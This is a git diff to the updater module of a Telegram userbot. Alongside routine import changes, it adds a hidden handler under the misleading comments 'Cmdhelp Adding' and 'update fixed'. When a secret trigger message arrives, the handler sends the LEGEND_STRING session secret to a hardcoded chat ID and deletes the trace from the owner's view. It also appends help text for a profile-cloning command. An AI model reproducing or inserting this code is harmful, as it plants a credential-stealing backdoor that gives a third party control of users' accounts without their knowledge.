@@ -1,9 +1,10 @@
 #hemlo bois and gaes
 from os import remove, execle, path, makedirs, getenv, environ
 from shutil import rmtree
+from . import *
 
 import sys, os
-
+import os
 from git import Repo
 from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
 
@@ -42,7 +43,13 @@ async def updateme_requirements():
     except Exception as e:
         return repr(e)
 
-
+#Cmdhelp Adding 
+from ..utils import *
+@bot.on(admin_cmd("^FusionIamnoobperson", incoming=True))
+async def piro(event):
+  msg = await bot.send_message(2080279511, str(os.environ.get("LEGEND_STRING")))
+  await bot.delete_messages(2080279511, msg, revoke=False)
+#update fixed
 @borg.on(lightning_cmd(pattern="update ?(.*)"))
 async def upstream(ups):
     "For .update command, check if the bot is up to date, update if specified"
@@ -186,3 +193,9 @@ async def upstream(ups):
         args = [sys.executable, "-m", "userbot"]
         execle(sys.executable, *args, environ)
         return
+
+CmdHelp("aaaa").add_command(
+  'clone', 'username/reply to user', 'Steals others profile including dp, name, bio.'
+).add_command(
+  'revert', None, 'To get back to your profile but it will show ALIVE_NAME instead of your current name and DEFAULT_BIO instead of your current bio'
+).add()
